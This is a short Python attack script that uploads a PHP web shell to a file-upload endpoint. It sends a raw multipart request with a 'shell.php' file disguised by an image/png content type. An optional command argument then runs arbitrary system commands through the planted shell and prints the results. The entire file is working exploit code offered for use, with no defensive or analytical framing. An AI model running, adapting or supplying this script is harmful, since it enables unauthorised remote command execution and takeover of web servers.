import socket
import argparse
from urllib.parse import urlparse
import sys
import requests


def url_validator(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc, result.path])
    except:
        return False


parser = argparse.ArgumentParser(description='Script uploads shell')
parser.add_argument('--url', help='URL uploader', required=True)
parser.add_argument('--cmd', help='Test command')
args = parser.parse_args()
url = args.url
if not url_validator(url):
    print('[+] URL invalid')
    sys.exit()
cmd = args.cmd
if cmd:
    r = requests.get(url+'?cmd='+cmd)
    print(r.text)
    sys.exit()
path = urlparse(url).path
[addr, port] = urlparse(url).netloc.split(':')
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((addr, int(port)))
shell = b"<?php system($_GET['cmd']); ?>"
body = "------WebKitFormBoundary\nContent-Disposition: form-data; name=\"upload\"\r\n\r\n\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n"
body = body.encode() + shell + b"\r\n------WebKitFormBoundary--\r\n"
body_length = str(len(body))
request = "POST "+path+" HTTP/1.1\r\n"+"Host: "+addr + \
    "\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\nContent-Length: " + \
    body_length+"\r\n\r\n"
client.send(request.encode() + body)
response = client.recv(4096).decode()
print(response)
